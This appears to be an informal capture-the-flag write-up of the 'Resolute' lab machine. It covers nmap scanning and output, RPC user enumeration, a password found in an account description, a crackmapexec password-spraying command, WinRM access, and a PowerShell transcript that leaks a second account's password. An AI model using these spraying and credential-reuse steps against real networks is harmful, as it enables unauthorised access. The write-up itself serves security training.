@@ -1,0 +1,246 @@
+so we begin the scan using nmap... but this time its alittle bit different.... we first of all get the entire ports that are necessary for enumeration and store it in  a variable called *result* then from the ports that we have obtained we are gonna enumerate them with another nmap scan... this is how I mean 
+
+result=$(nmap -p- --min-rate=1000 -T4 10.10.10.169 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//' | tr -d '%')
+
+so after it does the scan the output from the results variable will be stored in:
+
+nmap -p$result -sC -sV 10.10.10.169 -oA resolute
+
+the second enumeration will be for the service versions and the sc tag will be meaning a script scan and its a set of predefined scripts that scans  for vulnerabilities and  misconfigurations in the network... 
+
+and we see:
+
+# Nmap 7.94 scan initiated Sun Jul 16 19:58:44 2023 as: nmap -p53,88,135,139,389,445,464,593,636,3268,5985,9389,49664,49667,49671,49679,49684,50641,50680 -sC -sV -oA resolute 10.10.10.169
+Nmap scan report for 10.10.10.169
+Host is up (0.62s latency).
+
+PORT      STATE  SERVICE      VERSION
+53/tcp    open   domain       Simple DNS Plus
+88/tcp    open   kerberos-sec Microsoft Windows Kerberos (server time: 2023-07-16 17:05:55Z)
+135/tcp   open   msrpc        Microsoft Windows RPC
+139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp   open   ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
+445/tcp   open   55c0fe410   Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
+464/tcp   open   kpasswd5?
+593/tcp   open   ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp   open   tcpwrapped
+3268/tcp  open   ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
+5985/tcp  open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open   mc-nmf       .NET Message Framing
+49664/tcp open   unknown
+49667/tcp open   unknown
+49671/tcp open   unknown
+49679/tcp open   unknown
+49684/tcp open   unknown
+50641/tcp closed unknown
+50680/tcp closed unknown
+Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2h26m59s, deviation: 4h02m30s, median: 6m59s
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: Resolute
+|   NetBIOS computer name: RESOLUTE\x00
+|   Domain name: megabank.local
+|   Forest name: megabank.local
+|   FQDN: Resolute.megabank.local
+|_  System time: 2023-07-16T10:06:49-07:00
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2023-07-16T17:06:51
+|_  start_date: 2023-07-16T16:22:50
+| smb-security-mode: 
+|   account_used: <blank>
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+
+
+so we added the magabank.local in our /etc/hosts file together with the ip address... 
+
+now we begin enumeration... seeing kerberos service we see that this is an Active Directory... so we begin by enumerating microsoft rpc.... and we are able to obtain  a list of usernames:
+
+Administrator
+Guest
+krbtgt
+DefaultAccount
+ryan
+marko
+sunita
+abigail
+marcus
+sally
+fred
+angela
+felicia
+gustavo
+ulf
+stevie
+claire
+paulo
+steve
+annette
+annika
+per
+claude
+melanie
+zach
+simon
+naoki
+ and now through the usernames that we have obtained we try doing an ASreproasting using impacket-GetNPUsers and we find that the users are not asreproastable... so we proceed on to enumerate the users details using 
+
+ query user <username> to find more information concerning the users .... and funny enough we get the information of the user marko to be interesting as in the comments of the user marko we see that it  contains the password of the user marko 
+
+         User Name   :   marko
+        Full Name   :   Marko Novak
+        Home Drive  :
+        Dir Drive   :
+        Profile Path:
+        Logon Script:
+        Description :   Account created. Password set to Welcome123!
+        Workstations:
+        Comment     :
+        Remote Dial :
+        Logon Time               :      Thu, 01 Jan 1970 03:00:00 EAT
+        Logoff Time              :      Thu, 01 Jan 1970 03:00:00 EAT
+        Kickoff Time             :      Thu, 14 Sep 30828 05:48:05 EAT
+        Password last set Time   :      Fri, 27 Sep 2019 16:17:15 EAT
+        Password can change Time :      Sat, 28 Sep 2019 16:17:15 EAT
+        Password must change Time:      Thu, 14 Sep 30828 05:48:05 EAT
+        unknown_2[0..31]...
+        user_rid :      0x457
+        group_rid:      0x201
+        acb_info :      0x00000210
+        fields_present: 0x00ffffff
+        logon_divs:     168
+        bad_password_count:     0x00000000
+        logon_count:    0x00000000
+        padding1[0..7]...
+        logon_hrs[0..21]...
+
+
+the password that has been obtained is Welcome123!
+
+so lets use cme to check how we can use these creds to get access via winrm or smb.... on checking we see that we can't get access via winrm and smb... using the user marko... so we do a password spraying attack using crackmapexec... and using the users that we obtained 
+
+the command we use it 
+
+crackmapexec smb -u users -p 'Welcome123!' --pass-pol --continue-on-success 
+
+and we see that melanie has the same password as marko... so we can actually authenticate through those means... 
+
+we check again using crackmapexec if we can authenticate through winrm and smb for the user melanie and we see that its possible... first things first though... we check the smb shares before we get remote access through evil-winrm
+
+so after checking the shares... as user melanie... we don't see that much of interesting things... so we go on to get access through winrm... now with the access that we have gotten we start to check for privesc paths that we can use.... we check for cached passwords... but we get nothing... so lets use winPEASx64.exe 
+
+so after using winPEASx64.exe I do not get anything interesting so i move on to do manual enumeration on the directories... checking for interesting files and the likes.... 
+
+so we decide to go to the root directory and do an ls -force so that we be able to list hidden files as well... on listing we find an interesting folder... and its PSTranscripts... so we check over in the directory and find that the powershell commands were logged and in those logged commands we get the username and password ryan and Serv3r4Admin4cc123! respectively... lets see what we get from these creds
+
+we use the command querydispinfo --->to display info about the users we got through rpcclient 
+we can also use the command query user <username> to get diverse info about a certain user...
+
+
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+Windows PowerShell transcript start
+Start time: 20191203063201
+Username: MEGABANK\ryan
+RunAs User: MEGABANK\ryan
+Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
+Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
+Process ID: 2800
+PSVersion: 5.1.14393.2273
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
+BuildVersion: 10.0.14393.2273
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+Command start time: 20191203063455
+**********************
+PS>TerminatingError(): "System error."
+>> CommandInvocation(Invoke-Expression): "Invoke-Expression"
+>> ParameterBinding(Invoke-Expression): name="Command"; value="-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+>> CommandInvocation(Out-String): "Out-String"
+>> ParameterBinding(Out-String): name="Stream"; value="True"
+**********************
+Command start time: 20191203063455
+**********************
+PS>ParameterBinding(Out-String): name="InputObject"; value="PS megabank\ryan@RESOLUTE Documents> "
+PS megabank\ryan@RESOLUTE Documents>
+**********************
+Command start time: 20191203063515
+**********************
+PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
+>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+>> CommandInvocation(Out-String): "Out-String"
+>> ParameterBinding(Out-String): name="Stream"; value="True"
+**********************
+Windows PowerShell transcript start
+Start time: 20191203063515
+Username: MEGABANK\ryan
+RunAs User: MEGABANK\ryan
+Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
+Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
+Process ID: 2800
+PSVersion: 5.1.14393.2273
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
+BuildVersion: 10.0.14393.2273
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+**********************
+Command start time: 20191203063515
+**********************
+PS>CommandInvocation(Out-String): "Out-String"
+>> ParameterBinding(Out-String): name="InputObject"; value="The syntax of this command is:"
+cmd : The syntax of this command is:
+At line:1 char:1
++ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+cmd : The syntax of this command is:
+At line:1 char:1
++ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+**********************
+Windows PowerShell transcript start
+Start time: 20191203063515
+Username: MEGABANK\ryan
+RunAs User: MEGABANK\ryan
+Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
+Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
+Process ID: 2800
+PSVersion: 5.1.14393.2273
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
+BuildVersion: 10.0.14393.2273
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+
+
+/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+
